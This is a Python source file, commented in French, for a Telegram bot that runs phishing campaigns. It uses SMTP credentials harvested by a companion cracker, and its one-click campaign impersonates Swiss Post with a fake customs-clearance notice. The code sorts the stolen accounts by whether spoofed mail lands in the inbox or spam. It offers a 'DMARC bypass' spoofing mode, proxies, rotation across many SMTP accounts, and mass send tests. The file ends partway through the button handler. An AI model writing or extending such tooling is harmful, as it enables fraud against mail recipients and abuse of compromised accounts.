"""
BUST GO v5 — CAMPAIGN SENDER BOT (séparé du cracker)
Bot Telegram dédié à l'envoi de campagnes avec les SMTP trouvés.

Features:
  /start → Menu principal
  MES SMTP → Liste tous les AUTH OK avec boutons (AWS 1, Brevo 1, etc.)
  CAMPAGNE → Créer + lancer une campagne
  SPOOF TEST → Tester un envoi spoofé rapidement
"""
from __future__ import annotations

import asyncio
import io
import os
import re
import time

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from .db import DomainQueue, DEFAULT_DB
from .campaign_sender import (
    CampaignManager, SmtpAccount,
    run_campaign, stop_campaign, is_campaign_running,
)

DB_PATH = os.getenv("BUSTGO_HUNT_DB", DEFAULT_DB)
BOT_TOKEN = os.getenv("SENDER_BOT_TOKEN", "")
ADMIN_IDS = set()
_raw = os.getenv("SENDER_ADMIN_IDS", "")
for x in _raw.split(","):
    x = x.strip()
    if x.isdigit():
        ADMIN_IDS.add(int(x))

EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")

# Format: host:port|user:password|LABEL
SMTP_LINE_RE = re.compile(r"^([^|:]+):(\d+)\|([^|:]+):([^|]+)\|(.+)$")

# ---------------------------------------------------------------------------



# ---------------------------------------------------------------------------
# Ensure DB schema exists (found_creds table)
# ---------------------------------------------------------------------------
def _ensure_db_schema():
    """Create found_creds table if it does not exist."""
    import sqlite3 as _sql
    _db = _sql.connect(DB_PATH, timeout=120)
    _db.execute("PRAGMA journal_mode=WAL")
    _db.execute("PRAGMA busy_timeout=300000")
    _db.executescript("""
        CREATE TABLE IF NOT EXISTS found_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
            source_url TEXT, source_type TEXT, context TEXT,
            smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
            found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
            auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
            exploit_error TEXT, notified INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_creds_domain ON found_creds(domain);
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
    """)
    _db.commit()
    _db.close()

# Run schema init at import time
_ensure_db_schema()

def _allowed(update: Update) -> bool:
    user = update.effective_user
    return bool(user and ADMIN_IDS and user.id in ADMIN_IDS)


def _parse_smtp_line(line: str) -> dict | None:
    """Parse: host:port|user:password|LABEL → dict or None."""
    line = line.strip()
    if not line:
        return None
    m = SMTP_LINE_RE.match(line)
    if m:
        return {
            "host": m.group(1).strip(),
            "port": int(m.group(2)),
            "user": m.group(3).strip(),
            "password": m.group(4).strip(),
            "label": m.group(5).strip(),
        }
    # Fallback: try splitting by |
    parts = line.split("|")
    if len(parts) >= 2:
        hp = parts[0].split(":")
        up = parts[1].split(":", 1)
        label = parts[2].strip() if len(parts) > 2 else "MANUAL"
        if len(hp) >= 2 and len(up) >= 2:
            try:
                return {
                    "host": hp[0].strip(),
                    "port": int(hp[1].strip()),
                    "user": up[0].strip(),
                    "password": up[1].strip(),
                    "label": label,
                }
            except ValueError:
                pass
    return None


def _add_manual_smtp(smtp_data: dict) -> int:
    """Insert manual SMTP into found_creds with auth_ok=1. Returns cred ID."""
    import sqlite3
    db = sqlite3.connect(DB_PATH, timeout=120)
    db.row_factory = sqlite3.Row
    db.execute("PRAGMA journal_mode=WAL")
    db.execute("PRAGMA busy_timeout=300000")
    # Ensure table exists (safety net)
    db.execute("""CREATE TABLE IF NOT EXISTS found_creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
        source_url TEXT, source_type TEXT, context TEXT,
        smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
        found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
        auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
        exploit_error TEXT, notified INTEGER DEFAULT 0
    )""")
    db.commit()
    host = smtp_data["host"]
    port = smtp_data["port"]
    user = smtp_data["user"]
    password = smtp_data["password"]
    label = smtp_data["label"]
    domain = user.split("@")[1] if "@" in user else host
    # Detect provider from host
    provider = "manual"
    h = host.lower()
    for prov, kw in [("brevo", "brevo"), ("brevo", "sendinblue"), ("sendgrid", "sendgrid"),
                      ("mailgun", "mailgun"), ("aws_ses", "amazonaws"), ("postmark", "postmark"),
                      ("sparkpost", "sparkpost"), ("zoho", "zoho"), ("hostinger", "hostinger"),
                      ("ovh", "ovh"), ("ionos", "ionos"), ("gmail", "gmail"), ("outlook", "outlook"),
                      ("mailjet", "mailjet"), ("elastic_email", "elasticemail")]:
        if kw in h:
            provider = prov
            break
    for _retry in range(5):
        try:
            with db:
                cur = db.execute(
                    """INSERT INTO found_creds
                       (domain, provider, cred_type, value, source_url, source_type, context,
                        smtp_host, smtp_port, smtp_user, smtp_password,
                        found_at, exploited, auth_ok, email_sent, notified)
                       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,0,1,0,0)""",
                    (domain, provider, "password", password, "manual_add", "manual",
                     f"Manual: {label}", host, port, user, password, time.time()),
                )
                cred_id = cur.lastrowid
            db.close()
            return cred_id
        except Exception as _e:
            if "locked" in str(_e).lower() and _retry < 4:
                time.sleep(0.5 * (2 ** _retry))
                continue
            db.close()
            raise


# ---------------------------------------------------------------------------
# SMTP listing helpers
# ---------------------------------------------------------------------------
def _get_all_smtp() -> list[dict]:
    """Get all AUTH OK SMTP credentials from the cracker DB."""
    try:
        import sqlite3
        db = sqlite3.connect(DB_PATH, timeout=120)
        db.row_factory = sqlite3.Row
        db.execute("PRAGMA journal_mode=WAL")
        db.execute("PRAGMA busy_timeout=300000")
        # Ensure table exists
        db.execute("""CREATE TABLE IF NOT EXISTS found_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
            source_url TEXT, source_type TEXT, context TEXT,
            smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
            found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
            auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
            exploit_error TEXT, notified INTEGER DEFAULT 0
        )""")
        rows = db.execute(
            """SELECT id, domain, provider, smtp_host, smtp_port, 
                      smtp_user, smtp_password, auth_ok, email_sent,
                      found_at, source_type, context
               FROM found_creds 
               WHERE auth_ok = 1 
               ORDER BY found_at DESC"""
        ).fetchall()
        db.close()
        return [dict(r) for r in rows]
    except Exception:
        return []


def _get_smtp_by_id(cred_id: int) -> dict | None:
    try:
        import sqlite3
        db = sqlite3.connect(DB_PATH, timeout=120)
        db.row_factory = sqlite3.Row
        db.execute("PRAGMA journal_mode=WAL")
        db.execute("PRAGMA busy_timeout=300000")
        row = db.execute("SELECT * FROM found_creds WHERE id=? AND auth_ok=1", (cred_id,)).fetchone()
        db.close()
        return dict(row) if row else None
    except Exception:
        return None


def _format_smtp_label(smtp: dict, idx: int) -> str:
    """Format SMTP as button label: AWS 1, Brevo 2, etc."""
    provider = (smtp.get("provider") or "smtp").upper()
    return f"{provider} #{idx}"


def _format_smtp_detail(smtp: dict) -> str:
    """Format full SMTP details for display."""
    provider = (smtp.get("provider") or "?").upper()
    host = smtp.get("smtp_host") or "?"
    port = smtp.get("smtp_port") or "587"
    user = smtp.get("smtp_user") or "?"
    password = smtp.get("smtp_password") or "?"
    domain = smtp.get("domain") or "?"
    source = smtp.get("source_type") or "?"
    sent = "OUI" if smtp.get("email_sent") else "NON"
    context = smtp.get("context") or ""
    
    # Detect category
    cat = _classify_smtp(smtp)
    cat_line = f"Categorie: {cat}\n"
    
    return (
        f"{'='*30}\n"
        f"  SMTP #{smtp['id']} — {provider}\n"
        f"{'='*30}\n\n"
        f"{cat_line}"
        f"Domain: {domain}\n"
        f"Host: {host}:{port}\n"
        f"User: {user}\n"
        f"Pass: {password}\n"
        f"Source: {source}\n"
        f"Deja teste: {sent}\n"
    )


# ---------------------------------------------------------------------------
# Keyboards
# ---------------------------------------------------------------------------
def _kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("\u2709 CAMPAGNE SWISS POST", callback_data="camp_swisspost")],
        [InlineKeyboardButton("MES SMTP", callback_data="smtp_list")],
        [InlineKeyboardButton("ADD SMTP", callback_data="add_smtp")],
        [
            InlineKeyboardButton("SPOOF TEST", callback_data="spoof_test"),
            InlineKeyboardButton("TEMPLATES", callback_data="tpl_menu"),
        ],
        [InlineKeyboardButton("MASS SPOOF TEST", callback_data="mass_test")],
        [InlineKeyboardButton("MASS IMAP CHECK", callback_data="mass_imap")],
        [InlineKeyboardButton("NOUVELLE CAMPAGNE", callback_data="camp_new")],
        [
            InlineKeyboardButton("MES PROXIES", callback_data="proxy_list"),
            InlineKeyboardButton("ADD PROXY", callback_data="add_proxy"),
        ],
        [
            InlineKeyboardButton("MES CAMPAGNES", callback_data="camp_list"),
            InlineKeyboardButton("STATS", callback_data="stats"),
        ],
    ])


def _classify_smtp(s: dict) -> str:
    """Classify SMTP based on context field. Supports provider-specific categories."""
    ctx = (s.get("context") or "")
    # Provider-specific inbox
    if "SPOOF_INBOX_BOTH" in ctx:
        return "SPOOF_INBOX_BOTH"
    elif "SPOOF_INBOX_GMAIL" in ctx:
        return "SPOOF_INBOX_GMAIL"
    elif "SPOOF_INBOX_OUTLOOK" in ctx:
        return "SPOOF_INBOX_OUTLOOK"
    elif "SPOOF_INBOX_" in ctx:
        return "SPOOF_INBOX"
    elif "SPOOF_SPAM_GMAIL" in ctx:
        return "SPOOF_SPAM_GMAIL"
    elif "SPOOF_SPAM_OUTLOOK" in ctx:
        return "SPOOF_SPAM_OUTLOOK"
    elif "SPOOF_SPAM_" in ctx or ("SPOOF_" in ctx and "BASIQUE" not in ctx and "INBOX" not in ctx):
        return "SPOOF_SPAM"
    elif "BASIQUE_INBOX_BOTH" in ctx:
        return "BASIQUE_INBOX_BOTH"
    elif "BASIQUE_INBOX_GMAIL" in ctx:
        return "BASIQUE_INBOX_GMAIL"
    elif "BASIQUE_INBOX_OUTLOOK" in ctx:
        return "BASIQUE_INBOX_OUTLOOK"
    elif "BASIQUE_INBOX_" in ctx:
        return "BASIQUE_INBOX"
    elif "BASIQUE_SPAM_" in ctx or ("BASIQUE_" in ctx and "INBOX" not in ctx):
        return "BASIQUE_SPAM"
    return "AUTRE"


# Category display config: (label_prefix, header_emoji, header_text)
_CAT_CONFIG = {
    "SPOOF_INBOX_BOTH": ("SIB", "SPOOF INBOX BOTH"),
    "SPOOF_INBOX_GMAIL": ("SIG", "SPOOF INBOX GMAIL"),
    "SPOOF_INBOX_OUTLOOK": ("SIO", "SPOOF INBOX OUTLOOK"),
    "SPOOF_INBOX": ("SI", "SPOOF INBOX"),
    "SPOOF_SPAM_GMAIL": ("SSG", "SPOOF SPAM GMAIL"),
    "SPOOF_SPAM_OUTLOOK": ("SSO", "SPOOF SPAM OUTLOOK"),
    "SPOOF_SPAM":  ("SS", "SPOOF SPAM"),
    "BASIQUE_INBOX_BOTH": ("BIB", "BASIQUE INBOX BOTH"),
    "BASIQUE_INBOX_GMAIL": ("BIG", "BASIQUE INBOX GMAIL"),
    "BASIQUE_INBOX_OUTLOOK": ("BIO", "BASIQUE INBOX OUTLOOK"),
    "BASIQUE_INBOX": ("BI", "BASIQUE INBOX"),
    "BASIQUE_SPAM":  ("BS", "BASIQUE SPAM"),
    "AUTRE":       ("", "AUTRE"),
}
_CAT_ORDER = [
    "SPOOF_INBOX_BOTH", "SPOOF_INBOX_GMAIL", "SPOOF_INBOX_OUTLOOK", "SPOOF_INBOX",
    "SPOOF_SPAM_GMAIL", "SPOOF_SPAM_OUTLOOK", "SPOOF_SPAM",
    "BASIQUE_INBOX_BOTH", "BASIQUE_INBOX_GMAIL", "BASIQUE_INBOX_OUTLOOK", "BASIQUE_INBOX",
    "BASIQUE_SPAM", "AUTRE",
]


def _kb_smtp_select(smtp_list: list[dict], callback_prefix: str, callback_suffix: str = "", back_data: str = "back_main") -> InlineKeyboardMarkup:
    """Build a classified SMTP selection keyboard with 5 categories."""
    buttons = []

    grouped = {}
    for cat in _CAT_ORDER:
        grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

    for cat in _CAT_ORDER:
        items = grouped[cat]
        if not items:
            continue
        prefix_lbl, header = _CAT_CONFIG[cat]
        buttons.append([InlineKeyboardButton(
            f"--- {header} ({len(items)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(items, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"{callback_prefix}{cred['id']}{callback_suffix}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([InlineKeyboardButton("Retour", callback_data=back_data)])
    return InlineKeyboardMarkup(buttons)


def _kb_smtp_list(smtp_list: list[dict]) -> InlineKeyboardMarkup:
    """Build keyboard with SMTP grouped by 5 categories."""
    buttons = []

    grouped = {}
    for cat in _CAT_ORDER:
        grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

    for cat in _CAT_ORDER:
        items = grouped[cat]
        if not items:
            continue
        prefix_lbl, header = _CAT_CONFIG[cat]
        buttons.append([InlineKeyboardButton(
            f"--- {header} ({len(items)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(items, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"smtp_view_{cred['id']}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([
        InlineKeyboardButton("ADD SMTP", callback_data="add_smtp"),
        InlineKeyboardButton("Retour", callback_data="back_main"),
    ])
    return InlineKeyboardMarkup(buttons)


def _kb_smtp_actions(cred_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SPOOF TEST", callback_data=f"spoof_{cred_id}")],
        [InlineKeyboardButton("CAMPAGNE AVEC CE SMTP", callback_data=f"camp_with_{cred_id}")],
        [
            InlineKeyboardButton("Retour SMTP", callback_data="smtp_list"),
            InlineKeyboardButton("Menu", callback_data="back_main"),
        ],
    ])


# ---------------------------------------------------------------------------
# /start
# ---------------------------------------------------------------------------
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _allowed(update):
        return await update.effective_message.reply_text("Acces refuse.")
    
    smtp_count = len(_get_all_smtp())
    
    from .proxy_pool import ProxyPool
    pool = ProxyPool(DB_PATH)
    proxy_stats = pool.stats()
    pool.close()
    
    text = (
        "=============================\n"
        "  BUST GO // SENDER\n"
        "=============================\n\n"
        f"SMTP disponibles (AUTH OK): {smtp_count}\n"
        f"Proxies actifs: {proxy_stats['active']} / {proxy_stats['total']}\n\n"
        "MES SMTP → Voir/choisir tes SMTP\n"
        "CAMPAGNE → Creer + lancer un envoi\n"
        "SPOOF TEST → Test rapide spoofe\n"
        "MES PROXIES → Gerer tes proxies\n"
    )
    await update.effective_message.reply_text(text, reply_markup=_kb_main())


# ---------------------------------------------------------------------------
# Callbacks
# ---------------------------------------------------------------------------
async def callbacks(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass  # Stale callback, continue anyway
    if not _allowed(update):
        return await query.edit_message_text("Acces refuse.")
    
    data = query.data
    chat_id = query.message.chat_id

    # Ignore noop buttons (category headers)
    if data == "noop":
        return
    print(f"[CALLBACK] data={data} chat={chat_id}")

    # --- BACK MAIN ---
    if data == "back_main":
        smtp_count = len(_get_all_smtp())
        text = (
            "=============================\n"
            "  BUST GO // SENDER\n"
            "=============================\n\n"
            f"SMTP disponibles (AUTH OK): {smtp_count}\n"
        )
        return await query.edit_message_text(text, reply_markup=_kb_main())


    # --- CAMPAGNE SWISS POST (one-click) ---
    if data == "camp_swisspost":
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text("Aucun SMTP disponible.", reply_markup=_kb_main())
        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]
        si_c = sum(len(grouped[c]) for c in _CAT_ORDER if "SPOOF_INBOX" in c)
        ss_c = sum(len(grouped[c]) for c in _CAT_ORDER if "SPOOF_SPAM" in c)
        bi_c = sum(len(grouped[c]) for c in _CAT_ORDER if "BASIQUE_INBOX" in c)
        bs_c = sum(len(grouped[c]) for c in _CAT_ORDER if "BASIQUE_SPAM" in c)
        au_c = len(grouped.get("AUTRE", []))
        all_spoof = si_c + ss_c + au_c
        all_c = len(smtp_list)
        buttons = [
            [InlineKeyboardButton("SPOOF ONLY (" + str(all_spoof) + " SMTP)", callback_data="csp_mode_spoof")],
            [InlineKeyboardButton("SPOOF + BASIQUE (" + str(all_c) + " SMTP)", callback_data="csp_mode_both")],
            [InlineKeyboardButton("SPOOF INBOX (" + str(si_c) + " SMTP)", callback_data="csp_mode_inbox")],
            [InlineKeyboardButton("Retour", callback_data="back_main")],
        ]
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST\n\n"
            "Template: Post CH SA\n"
            "From: Post CH SA <notifications@post.ch>\n"
            "Subject: Votre envoi est en cours de dedouanement\n\n"
            "SPOOF INBOX: " + str(si_c) + "\n"
            "SPOOF SPAM: " + str(ss_c) + "\n"
            "BASIQUE INBOX: " + str(bi_c) + "\n"
            "BASIQUE SPAM: " + str(bs_c) + "\n"
            "AUTRE: " + str(au_c) + "\n\n"
            "SPOOF = From complet fake\n"
            "BASIQUE = swisspost@domaine_smtp\n"
            "INBOX = arrive en inbox\n\n"
            "Choisis le mode:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data.startswith("csp_mode_"):
        mode = data.split("_")[-1]
        ctx.user_data["csp_mode"] = mode
        ctx.user_data["waiting"] = "csp_rate"
        mode_label = "SPOOF ONLY" if mode == "spoof" else "SPOOF + BASIQUE"
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST \u2014 " + mode_label + "\n\n"
            "Etape 1/2: Envoie le RATE par minute\n"
            "(ex: 30 = 30 mails/min)\n\n"
            "/cancel pour annuler"
        )


    # --- ADD SMTP MANUAL ---
    if data == "add_smtp":
        ctx.user_data["waiting"] = "add_smtp_lines"
        return await query.edit_message_text(
            "ADD SMTP MANUEL\n\n"
            "Format: host:port|user:password|LABEL\n\n"
            "Exemples:\n"
            "smtp.hostinger.mx:587|user@domain.com:mypass|HOSTINGER1\n"
            "smtp-relay.brevo.com:587|api@brevo.com:xkeysib-xxx|BREVO1\n"
            "smtp.sendgrid.net:587|apikey:SG.xxx|SENDGRID1\n\n"
            "Tu peux coller PLUSIEURS lignes d'un coup.\n"
            "Ou envoie un fichier .txt\n\n"
            "/cancel pour annuler"
        )

    # --- MASS SPOOF TEST ---
    if data == "mass_test":
        ctx.user_data["waiting"] = "mass_test_email"
        return await query.edit_message_text(
            "MASS SPOOF TEST\n\n"
            "Test une liste de SMTP avec un vrai envoi spoofe.\n"
            "Chaque SMTP est teste avec From: Swiss Post <noreply@post.ch>\n"
            "Si rejete, retry avec noreply@post (sans TLD)\n\n"
            "Etape 1/3: Envoie l'EMAIL DESTINATAIRE\n"
            "(celui qui recoit les tests)\n\n"
            "/cancel pour annuler"
        )

    if data.startswith("mass_tpl_"):
        tpl_key = data[9:]
        ctx.user_data["mass_tpl"] = tpl_key
        ctx.user_data["waiting"] = "mass_test_file"
        from .spoof_templates import get_template
        tpl = get_template(tpl_key)
        brand = tpl["brand"] if tpl else tpl_key
        return await query.edit_message_text(
            f"MASS SPOOF TEST — {brand}\n\n"
            f"To: {ctx.user_data.get('mass_test_to', '?')}\n"
            f"Template: {brand}\n\n"
            "Etape 3/3: Envoie le FICHIER .txt avec les SMTP\n\n"
            "Format par ligne:\n"
            "host:port|user:password|LABEL\n\n"
            "Ou colle les lignes directement.\n"
            "/cancel pour annuler"
        )

    # --- MASS IMAP CHECK ---
    if data == "mass_imap":
        from .imap_checker import is_gmail_checker_configured, get_gmail_checker_email
        if not is_gmail_checker_configured():
            return await query.edit_message_text(
                "MASS IMAP CHECK\n\n"
                "Gmail checker non configure.\n"
                "Configure email + app password dans imap_checker.py",
                reply_markup=_kb_main(),
            )
        ctx.user_data["waiting"] = "mass_imap_tpl"
        from .spoof_templates import SPOOF_TEMPLATES
        buttons = []
        for key, tpl in SPOOF_TEMPLATES.items():
            buttons.append([InlineKeyboardButton(
                f"{tpl['brand']}", callback_data=f"mimap_tpl_{key}"
            )])
        return await query.edit_message_text(
            "MASS IMAP CHECK\n\n"
            "Envoie un spoof depuis chaque SMTP vers:\n"
            f"{get_gmail_checker_email()}\n\n"
            "Puis verifie via IMAP si le mail est arrive\n"
            "en INBOX, SPAM ou pas du tout.\n\n"
            "Etape 1/2: Choisis le TEMPLATE de spoof:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data.startswith("mimap_tpl_"):
        tpl_key = data[10:]
        ctx.user_data["mimap_tpl"] = tpl_key
        ctx.user_data["waiting"] = "mass_imap_file"
        from .spoof_templates import get_template
        tpl = get_template(tpl_key)
        brand = tpl["brand"] if tpl else tpl_key
        return await query.edit_message_text(
            f"MASS IMAP CHECK — {brand}\n\n"
            f"Template: {brand}\n"
            f"From: {tpl['from_name']} <{tpl['from_email']}>\n\n"
            "Etape 2/2: Envoie le FICHIER .txt avec les SMTP\n\n"
            "Format par ligne:\n"
            "host:port|user:password|LABEL\n\n"
            "Ou colle les lignes directement.\n"
            "/cancel pour annuler"
        )

    # --- TEMPLATE MENU ---
    if data == "tpl_menu":
        from .spoof_templates import SPOOF_TEMPLATES
        smtp_list = _get_all_smtp()
        smtp_count = len(smtp_list)
        buttons = []
        for key, tpl in SPOOF_TEMPLATES.items():
            buttons.append([InlineKeyboardButton(
                f"{tpl['brand']} — {tpl['subject'][:35]}...",
                callback_data=f"tpl_{key}",
            )])
        buttons.append([InlineKeyboardButton("Retour", callback_data="back_main")])
        return await query.edit_message_text(
            "SPOOF TEMPLATES\n\n"
            "Choisis un template.\n"
            f"SMTP disponibles: {smtp_count}\n\n"
            "Mode: Unicode Thin Space (DMARC bypass)",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data.startswith("tpl_") and not data.startswith("tpl_smtp_"):
        tpl_key = data[4:]
        from .spoof_templates import get_template
        tpl = get_template(tpl_key)
        if not tpl:
            return await query.edit_message_text("Template introuvable.", reply_markup=_kb_main())
        ctx.user_data["tpl_key"] = tpl_key
        # Show SMTP selection
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text(
                "Aucun SMTP disponible. Ajoute-en d'abord.",
                reply_markup=_kb_main(),
            )
        kb = _kb_smtp_select(smtp_list, "tpl_smtp_", f"_{tpl_key}", back_data="tpl_menu")
        return await query.edit_message_text(
            f"TEMPLATE: {tpl['brand']}\n"
            f"From: {tpl['from_name']} <{tpl['from_email']}>\n"
            f"Subject: {tpl['subject']}\n\n"
            "Choisis le SMTP:",
            reply_markup=kb,
        )

    if data.startswith("tpl_smtp_"):
        parts = data.split("_", 3)  # tpl_smtp_ID_KEY
        cred_id = int(parts[2])
        tpl_key = parts[3] if len(parts) > 3 else ctx.user_data.get("tpl_key", "")
        from .spoof_templates import get_template
        tpl = get_template(tpl_key)
        smtp = _get_smtp_by_id(cred_id)
        if not tpl or not smtp:
            return await query.edit_message_text("Template/SMTP introuvable.", reply_markup=_kb_main())
        # Ask for recipient
        ctx.user_data["waiting"] = "tpl_send_to"
        ctx.user_data["tpl_data"] = {
            "tpl_key": tpl_key,
            "smtp_id": cred_id,
        }
        provider = (smtp.get("provider") or "?").upper()
        return await query.edit_message_text(
            f"TEMPLATE SPOOF\n\n"
            f"Brand: {tpl['brand']}\n"
            f"From: {tpl['from_name']} <{tpl['from_email']}>\n"
            f"Subject: {tpl['subject']}\n"
            f"SMTP: {provider} #{cred_id}\n\n"
            "Envoie l'adresse DESTINATAIRE:\n"
            "/cancel pour annuler"
        )

    # --- SMTP LIST ---
    if data == "smtp_list":
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text(
                "Aucun SMTP AUTH OK disponible.\n\n"
                "Le cracker doit d'abord trouver des credentials.\n"
                "Attends que des AUTH OK tombent.",
                reply_markup=_kb_main(),
            )
        
        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]
        
        lines = [
            "=============================",
            "  MES SMTP (AUTH OK)",
            "=============================",
            "",
        ]
        
        _si = sum(len(grouped[c]) for c in _CAT_ORDER if "SPOOF_INBOX" in c)
        _ss = sum(len(grouped[c]) for c in _CAT_ORDER if "SPOOF_SPAM" in c)
        _bi = sum(len(grouped[c]) for c in _CAT_ORDER if "BASIQUE_INBOX" in c)
        _bs = sum(len(grouped[c]) for c in _CAT_ORDER if "BASIQUE_SPAM" in c)
        _au = len(grouped.get("AUTRE", []))
        if _si: lines.append(f"SPOOF INBOX: {_si}")
        if _ss: lines.append(f"SPOOF SPAM: {_ss}")
        if _bi: lines.append(f"BASIQUE INBOX: {_bi}")
        if _bs: lines.append(f"BASIQUE SPAM: {_bs}")
        if _au: lines.append(f"AUTRES: {_au}")
        
        lines.append(f"\nTOTAL: {len(smtp_list)}")
        lines.append("\nChoisis un SMTP:")
        
        return await query.edit_message_text(
            "\n".join(lines),
            reply_markup=_kb_smtp_list(smtp_list),
        )

    # --- SMTP VIEW ---
    if data.startswith("smtp_view_"):
        cred_id = int(data.split("_")[-1])
        smtp = _get_smtp_by_id(cred_id)
        if not smtp:
            return await query.edit_message_text("SMTP introuvable.", reply_markup=_kb_main())
        
        text = _format_smtp_detail(smtp)
        return await query.edit_message_text(text, reply_markup=_kb_smtp_actions(cred_id))

    # --- SPOOF TEST (rapide) ---
    if data == "spoof_test":
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text(
                "Aucun SMTP disponible. Attends les AUTH OK.",
                reply_markup=_kb_main(),
            )
        # Pick first available
        kb = _kb_smtp_select(smtp_list, "spoof_", "", back_data="back_main")
        
        return await query.edit_message_text(
            "SPOOF TEST\n\nChoisis le SMTP a utiliser:",
            reply_markup=kb,
        )

    if data.startswith("spoof_"):
        cred_id = int(data.split("_")[-1])
        smtp = _get_smtp_by_id(cred_id)
        if not smtp:
            return await query.edit_message_text("SMTP introuvable.", reply_markup=_kb_main())
        
        ctx.user_data["waiting"] = "spoof_to"
        ctx.user_data["spoof_smtp_id"] = cred_id
        provider = (smtp.get("provider") or "?").upper()
        
        return await query.edit_message_text(
            f"SPOOF TEST — {provider} #{cred_id}\n"
            f"Host: {smtp.get('smtp_host')}:{smtp.get('smtp_port')}\n\n"
            "Etape 1/3: Envoie l'adresse DESTINATAIRE\n"
            "(l'email qui va recevoir le test)\n"
            "/cancel pour annuler"
        )

    # --- CAMPAIGN WITH SPECIFIC SMTP ---
    if data.startswith("camp_with_"):
        cred_id = int(data.split("_")[-1])
        smtp = _get_smtp_by_id(cred_id)
        if not smtp:
            return await query.edit_message_text("SMTP introuvable.", reply_markup=_kb_main())
        
        ctx.user_data["waiting"] = "camp_subject"
        ctx.user_data["camp_data"] = {"smtp_id": cred_id}
        provider = (smtp.get("provider") or "?").upper()
        
        return await query.edit_message_text(
            f"CAMPAGNE — SMTP: {provider} #{cred_id}\n"
            f"Host: {smtp.get('smtp_host')}:{smtp.get('smtp_port')}\n\n"
            "Etape 1/6: Envoie le SUJET du mail\n"
            "/cancel pour annuler"
        )

    # --- NEW CAMPAIGN (choose SMTP first) ---
    if data == "camp_new":
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text(
                "Aucun SMTP disponible.",
                reply_markup=_kb_main(),
            )
        
        buttons = []
        # Option multi-SMTP rotation
        buttons.append([InlineKeyboardButton(
            f"TOUS ({len(smtp_list)} SMTP rotation)",
            callback_data="camp_all_smtp"
        )])
        
        # Classified SMTP buttons (5 categories)
        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

        for cat in _CAT_ORDER:
            items = grouped[cat]
            if not items:
                continue
            prefix_lbl, header = _CAT_CONFIG[cat]
            buttons.append([InlineKeyboardButton(
                f"--- {header} ({len(items)}) ---", callback_data="noop"
            )])
            row = []
            for i, cred in enumerate(items, 1):
                prov = (cred.get("provider") or "smtp").upper()
                label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
                row.append(InlineKeyboardButton(label, callback_data=f"camp_with_{cred['id']}"))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)
        
        buttons.append([InlineKeyboardButton("Retour", callback_data="back_main")])
        
        return await query.edit_message_text(
            "NOUVELLE CAMPAGNE\n\n"
            "Choisis le SMTP (ou TOUS pour rotation):",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data == "camp_all_smtp":
        ctx.user_data["waiting"] = "camp_subject"
        ctx.user_data["camp_data"] = {"smtp_id": "all"}
        return await query.edit_message_text(
            "CAMPAGNE — MULTI-SMTP ROTATION\n\n"
            "Etape 1/6: Envoie le SUJET du mail\n"
            "/cancel pour annuler"
        )

